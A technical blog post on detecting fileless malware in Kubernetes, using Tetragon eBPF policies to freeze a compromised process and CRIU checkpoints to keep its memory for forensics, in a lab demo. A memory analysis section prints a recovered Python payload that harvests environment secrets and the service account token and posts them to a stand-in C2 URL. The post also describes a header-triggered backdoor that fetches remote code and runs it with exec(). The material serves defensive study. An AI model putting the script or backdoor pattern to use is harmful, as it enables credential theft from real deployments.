---
title: "Detecting and Capturing Fileless Malware in Kubernetes"
description: "How to detect fileless malware in Kubernetes using eBPF (Tetragon) and preserve forensic evidence with CRIU memory checkpoints before the attacker's code disappears."
pubDate: 2026-01-13
draft: false
---

## Using eBPF and Memory Forensics for Container Incident Response

## TL;DR

This post demonstrates a method for detecting and preserving evidence from fileless malware attacks in Kubernetes containers. The full demo and source code are available at [github.com/bertomaa/container-freeze](https://github.com/bertomaa/container-freeze).

- **Problem**: Fileless malware executes entirely in memory—no binaries written to disk, no file hashes to scan, nothing for traditional forensics tools to find. When security teams detect suspicious activity and kill the container (the standard response), all evidence is destroyed along with the process memory.

- **Solution**: Use eBPF-based observability (Tetragon) to detect malicious behavior at the kernel level by monitoring syscalls. Instead of killing the process, send SIGSTOP to freeze it mid-execution. Then use CRIU (Checkpoint/Restore In Userspace) to dump the container's complete memory state—including the malware code and any stolen data still in memory.

- **Result**: The in-memory malware script is recovered verbatim from the checkpoint. Stolen credentials (AWS keys, database passwords, API tokens) that were being exfiltrated are preserved. The complete attack timeline—from payload download to credential harvesting—is captured for analysis.

- **Requirements**: containerd 2.0+ (CRI checkpoint support), Tetragon, CRIU 3.16+, Linux kernel 5.x+
---

## Background

Container security tooling typically operates on files: scanning images for CVEs, checking binaries for signatures, auditing configuration files. Fileless attacks bypass this by downloading and executing code directly in memory without writing to disk.

In containerized environments, this creates a forensics problem. Containers are ephemeral. If a compromised pod is terminated (the standard response), the process memory—and all evidence of the attack—is lost.

---

## Technical Approach

The approach uses two components:

### Tetragon (eBPF-based detection)

Tetragon is a security observability tool from the Cilium project. It uses eBPF to monitor kernel-level events (syscalls, file access, network connections) without requiring a userspace agent in each container.

eBPF (Extended Berkeley Packet Filter) is a Linux kernel feature that allows running sandboxed programs in the kernel. Tetragon uses this to observe and respond to system calls as they happen.

Key capability: Tetragon can send signals to processes when specific conditions are met. By sending SIGSTOP when malicious behavior is detected, the process is frozen mid-execution rather than killed.

### CRIU (memory capture)

CRIU (Checkpoint/Restore In Userspace) can dump the complete memory state of a running process to disk. This includes:

- Process memory (heap, stack, mapped regions)
- Open file descriptors
- Register state
- Signal handlers

For fileless malware, this is the only way to capture the malicious code—it exists nowhere else.

Container checkpointing is triggered via `crictl`, which communicates directly with the container runtime (containerd) rather than going through the Kubernetes API.
---

## Demo Setup

[Container Freeze](https://github.com/bertomaa/container-freeze) includes a demonstration of this workflow. For detailed setup instructions and component documentation, see the [fileless-attack demo README](https://github.com/bertomaa/container-freeze/blob/main/demos/fileless-attack/README.md).

### Architecture Overview

```
┌──────────────────────────────────────────────────────────────────────────────┐
│                           KUBERNETES CLUSTER                                 │
│                                                                              │
│  ┌──────────────────────────────────┐     ┌──────────────────────────────┐   │
│  │      production namespace        │     │   malicious-cdn namespace    │   │
│  │                                  │     │                              │   │
│  │  ┌─────────────────────────────┐ │     │  ┌────────────────────────┐  │   │
│  │  │     payment-backend         │ │     │  │    payload-server      │  │   │
│  │  │  ┌───────────────────────┐  │ │     │  │                        │  │   │
│  │  │  │      Flask App        │  │ │     │  │  Serves malicious      │  │   │
│  │  │  │  /api/health ─────────┼──┼─┼─────┼──┼─ Python script         │  │   │
│  │  │  │  (hidden backdoor)    │  │ │ 1-3 │  │                        │  │   │
│  │  │  │          │            │  │ │     │  └────────────────────────┘  │   │
│  │  │  │          ▼ 4          │  │ │     │                              │   │
│  │  │  │  ┌─────────────────┐  │  │ │     └──────────────────────────────┘   │
│  │  │  │  │  exec() ────────┼──┼──┼─┼──▶  Script runs                       │
│  │  │  │  │  (memory only)  │  │  │ │                                        │
│  │  │  │  └────────┬────────┘  │  │ │                                        │
│  │  │  │           │ 5         │  │ │                                        │
│  │  │  │           ▼           │  │ │                                        │
│  │  │  │  Reads /var/run/secrets│ │ │                                        │
│  │  │  │  Reads /proc/self/environ│ │                                        │
│  │  │  │           │           │  │ │                                        │
│  │  │  └───────────┼───────────┘  │ │                                        │
│  │  └──────────────┼──────────────┘ │                                        │
│  └─────────────────┼────────────────┘                                        │
│                    │                                                         │
│  ┌─────────────────▼────────────────┐                                        │
│  │           TETRAGON (eBPF)        │                                        │
│  │  ┌─────────────────────────────┐ │                                        │
│  │  │  TracingPolicy detects:     │ │                                        │
│  │  │  - sys_openat on secrets    │ │                                        │
│  │  │  - sys_openat on /proc/env  │ │                                        │
│  │  │          │                  │ │                                        │
│  │  │          ▼ 6                │ │                                        │
│  │  │  ┌───────────────────────┐  │ │                                        │
│  │  │  │  SIGSTOP (signal 19)  │  │ │  ◄─ ─ Process FROZEN!                  │
│  │  │  │  Process suspended    │  │ │                                        │
│  │  │  └───────────────────────┘  │ │                                        │
│  │  └─────────────────────────────┘ │                                        │
│  └──────────────────────────────────┘                                        │
│                    │                                                         │
│                    ▼ 7                                                       │
│  ┌───────────────────────────────────┐                                       │
│  │        CRIU CHECKPOINT            │                                       │
│  │  - Captures entire memory state   │                                       │
│  │  - In-memory script preserved!    │                                       │
│  │  - Credentials visible in dump    │                                       │
│  └───────────────────────────────────┘                                       │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘

ATTACK TIMELINE:
================
1. Attacker sends: curl -H "X-Debug: enable" /api/health
2. Backdoor activates in background thread
3. Downloads malicious script from payload-server
4. Script executes via exec() - MEMORY ONLY
5. Script attempts to read K8s secrets and env vars
6. Tetragon detects syscall, sends SIGSTOP
7. CRIU captures frozen process memory for forensics
```

### The Scenario

The demo simulates a supply chain attack. A "payment-backend" container image has been compromised before deployment—the attacker injected a backdoor into the source code or build pipeline. The image passed CI/CD checks (vulnerability scans, signature verification) because the backdoor code is small and doesn't match known malware signatures.

The backdoor is embedded in the `/api/health` endpoint. This endpoint is commonly used by Kubernetes liveness/readiness probes and load balancers, so it receives frequent legitimate traffic. Under normal operation, the endpoint returns a standard health response:

```json
{"service":"payment-backend","status":"healthy","version":"3.2.1"}
```

The backdoor activates only when a specific HTTP header is present: `X-Debug: enable`. When triggered:

1. The endpoint returns the same normal response (no visible difference)
2. In the background, it fetches a Python script from a C2 server
3. The script is executed via `exec()` directly in memory—no file is written to disk

This pattern is difficult to detect because:
- The malicious code path only executes with the secret header
- Health endpoints are high-traffic and rarely audited
- The payload never touches the filesystem

### Infrastructure

- K3s single-node cluster (self-managed Kubernetes)
- Tetragon with TracingPolicy configured to send SIGSTOP on credential file access
- The "payment-backend" pod running in the `production` namespace
- A payload server in the `malicious-cdn` namespace simulating an attacker's C2

Note: The C2 server runs inside the same cluster for demo simplicity. In a real attack, the C2 would be an external server on the internet. The detection and checkpointing workflow is the same regardless of where the payload originates.

### Malware Behavior

Once triggered, the payload executes four stages:

| Stage | Action | Details |
|-------|--------|---------|
| 1. Reconnaissance | Harvest secrets | Scans environment variables for keys containing `SECRET`, `PASSWORD`, `TOKEN`, `AWS`, `STRIPE`, `DATABASE`. Reads `/var/run/secrets/kubernetes.io/serviceaccount/token` for the pod's service account token. |
| 2. Exfiltration | Send data to C2 | Packages stolen credentials and sends them via HTTP POST to the C2 server. |
| 3. Persistence | Attempt footholds | Tries to write to `/etc/cron.d/backdoor` and `/root/.ssh/authorized_keys`. These fail due to read-only filesystem, but generate detectable events. |


The malware is designed to complete stages 1-2 quickly. The detection triggers during stage 1 when it attempts to read the service account token.

### Tetragon Policies

Two TracingPolicies are deployed:

**1. `detect-and-freeze-fileless-exec`** (blocking policy)

This policy monitors file access syscalls and sends SIGSTOP when sensitive files are accessed:

```yaml
kprobes:
- call: "sys_openat"
  syscall: true
  selectors:
  - matchArgs:
    - index: 1
      operator: "Prefix"
      values:
      - "/var/run/secrets/kubernetes.io/serviceaccount"
      - "/proc/self/environ"
      - "/etc/shadow"
    matchActions:
    - action: Signal
      argSig: 19  # SIGSTOP
```

The policy is scoped to pods with `app: payment-backend` label to avoid freezing system processes.

Monitored paths:
- `/var/run/secrets/kubernetes.io/serviceaccount/*` — Kubernetes service account tokens
- `/proc/self/environ` — Process environment variables (contains secrets)
- `/etc/shadow` — Password hashes

**2. `detect-payload-download`** (logging policy)

This policy logs network activity without blocking:

- `tcp_connect` — Outbound TCP connections (payload download, exfiltration)
- `udp_sendmsg` — DNS queries (resolving C2 hostname)
- `sys_socket` — Socket creation for AF_INET/SOCK_STREAM
- `sys_sendto` — Data transmission (exfiltration payload)

These events provide forensic context but don't trigger SIGSTOP—the goal is to let the attack proceed far enough to capture meaningful evidence before freezing.

### Attack Flow

```
┌─────────────────────────────────────────────────────────────────────────┐
│                              ATTACK FLOW                                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  1. TRIGGER         Attacker sends request with X-Debug: enable header  │
│        │                                                                │
│        ▼                                                                │
│  2. DOWNLOAD        Backdoor fetches payload from C2 server             │
│        │            (payload-server.malicious-cdn.svc.cluster.local)    │
│        ▼                                                                │
│  3. EXECUTE         Python exec() runs payload directly in memory       │
│        │            No file written to disk                             │
│        ▼                                                                │
│  4. DETECT          Tetragon sees openat() on serviceaccount/token      │
│        │            TracingPolicy matches, sends SIGSTOP                │
│        ▼                                                                │
│  5. CAPTURE         CRIU checkpoints frozen container                   │
│        │            Memory dump includes malware script + stolen data   │
│        ▼                                                                │
│  6. QUARANTINE      NetworkPolicy isolates pod from network             │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Demo Execution

### Phase 1: Environment Verification

The demo verifies all components are running:

```
  [1/5] Kubernetes cluster ................. OK (1 node(s))
  [2/5] Tetragon (eBPF monitoring) ........ OK (BLOCKING mode)
  [3/5] TracingPolicy (SIGSTOP config) .... OK (2 policy/policies)
  [4/5] Payment backend (target pod) ...... OK (payment-backend-86f49bc885-j5g99)
  [5/5] Payload server (attacker C2) ...... OK (Running)
```

Normal health endpoint response:

```
curl http://payment-backend:8080/api/health
{"service":"payment-backend","status":"healthy","version":"3.2.1"}
```

### Phase 2: Attack Trigger

The backdoor is triggered by including the `X-Debug: enable` header:

```
curl -H 'X-Debug: enable' http://payment-backend:8080/api/health
```

The response appears normal, but the backdoor has initiated:
1. Downloaded malicious Python script from C2 server
2. Executed script in memory via `exec()`
3. Script begins reconnaissance and credential harvesting

### Phase 3: Tetragon Detection

When the malware attempts to read the Kubernetes service account token, Tetragon detects the syscall and sends SIGSTOP.

Tetragon event (key fields extracted):

| Field | Value |
|-------|-------|
| Process | `/usr/local/bin/python` |
| PID | 41068 |
| Working Directory | `/app` |
| Pod | `payment-backend-86f49bc885-j5g99` |
| Namespace | `production` |
| Function | `__x64_sys_openat` |
| Target File | `/var/run/secrets/kubernetes.io/serviceaccount/token` |
| Action | `KPROBE_ACTION_SIGNAL` (SIGSTOP) |
| Policy | `detect-and-freeze-fileless-exec` |

Payload server log confirms the download occurred:

```
2026-01-13 13:27:29 - 10.42.0.7 downloaded payload
```

### Phase 4: CRIU Checkpoint

With the process frozen by Tetragon (SIGSTOP), we trigger the checkpoint via `crictl checkpoint`, which communicates directly with containerd.

*Note: Since the process is already in a stopped state (T) due to Tetragon, CRIU effectively captures this "frozen" state.*
```
Container ID: bbe1787f2b0b...
Output path:  /tmp/k8s-checkpoints/payment-backend-86f49bc885-j5g99_20260113_132736/checkpoint.tar
```

The checkpoint includes all process memory, which contains the malware script and any data it collected.

### Phase 5: Memory Analysis

Extracting strings from the checkpoint reveals the malware:

**Recovered script content from memory:**

```python
# FILELESS MALWARE PAYLOAD

import os
import socket
import subprocess
import urllib.request
import json

# STAGE 1: Reconnaissance
# Harvest environment variables containing secrets
secrets = {}
for key, value in os.environ.items():
    if any(x in key.upper() for x in ['KEY', 'SECRET', 'PASSWORD', 'TOKEN', 'CREDENTIAL', 'AWS', 'STRIPE', 'DATABASE']):
        secrets[key] = value

# Get Kubernetes service account token
k8s_token = None
try:
    with open('/var/run/secrets/kubernetes.io/serviceaccount/token', 'r') as f:
        k8s_token = f.read()
except:
    pass

# STAGE 2: Data Exfiltration
exfil_data = {
    "hostname": socket.gethostname(),
    "namespace": namespace,
    "secrets": secrets,
    "k8s_token": k8s_token[:100] if k8s_token else None,
}

# Exfiltrate via HTTP POST to C2
c2_url = "http://payload-server.malicious-cdn.svc.cluster.local:8080/exfil"
req = urllib.request.Request(c2_url, data=json.dumps(exfil_data).encode('utf-8'))
urllib.request.urlopen(req, timeout=5)

# STAGE 3: Persistence attempts
# (attempts to write to /etc/cron.d/backdoor, /root/.ssh/authorized_keys)
# [...REDACTED...]
```

**Credentials found in memory:**

| Variable | Value |
|----------|-------|
| `AWS_ACCESS_KEY_ID` | `AKIAIOSFODNN7EXAMPLE` |
| `AWS_SECRET_ACCESS_KEY` | `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY` |
| `DATABASE_URL` | `postgresql://admin:SuperSecret123@db.prod.internal:5432/payments` |
| `STRIPE_API_KEY` | `sk_live_51JabcdefghijklmnopQRSTUVWXYZ` |

**Stage execution evidence:**

```
[PAYLOAD] Stage 1: Reconnaissance...
[PAYLOAD] Stage 2: Preparing exfiltration package...
[PAYLOAD] Stage 3: Attempting persistence...
[PAYLOAD] Stage 4: Payload complete - maintaining memory presence...
```

### Phase 6: Quarantine

A NetworkPolicy is applied to isolate the pod:

```
networkpolicy.networking.k8s.io/quarantine-payment-backend-86f49bc885-j5g99 created
```

The pod can still resolve DNS (for logging) but cannot reach the C2 server or other network resources.

---

## Forensic Output

The demo produces a forensic bundle containing:

- `checkpoint.tar` - CRIU memory dump
- Container logs
- Payload server logs
- Extracted memory strings

Location: `/tmp/k8s-checkpoints/<pod-name>_<timestamp>_forensics.tar.gz`

---

## Comparison with Standard Response

| Aspect | Kill Pod | Checkpoint + Kill |
|--------|----------|-------------------|
| Malware code preserved | No | Yes |
| Stolen data visible | No | Yes |
| Attack timeline | Partial (logs only) | Complete |
| C2 communication details | Lost | Preserved |
| Active Threat Stopped |	Immediate (SIGKILL)	| Immediate (SIGSTOP)
---

## Requirements

- containerd 2.0+ (CRI checkpoint support)
- Tetragon (eBPF observability)
- CRIU 3.0+ 
- Linux kernel 5.x+ (eBPF features)

*Note: Since checkpointing uses `crictl` (which talks directly to containerd), there is no strict Kubernetes version requirement. The Kubernetes 1.25+ checkpoint API is an alternative approach but is not used here.*

---

## Getting Started

The [Container Freeze](https://github.com/bertomaa/container-freeze) repository includes everything needed to reproduce this demo.

```bash
git clone https://github.com/bertomaa/container-freeze
cd container-freeze
./cfreeze
```

The CLI handles VM provisioning, K3s installation, Tetragon setup, and demo execution. See the [fileless-attack demo documentation](https://github.com/bertomaa/container-freeze/blob/main/demos/fileless-attack/README.md) for detailed component breakdowns and customization options.

---

## Summary

- Fileless malware executes in memory without writing files to disk
- Standard forensics (file hashes, disk analysis) cannot detect it
- Tetragon can detect and freeze suspicious processes using eBPF and SIGSTOP
- CRIU captures process memory, preserving the malware and stolen data
- This approach trades a few seconds of response time for complete forensic evidence

---

*Container Freeze is an open-source proof of concept. Repository: [github.com/bertomaa/container-freeze](https://github.com/bertomaa/container-freeze)*
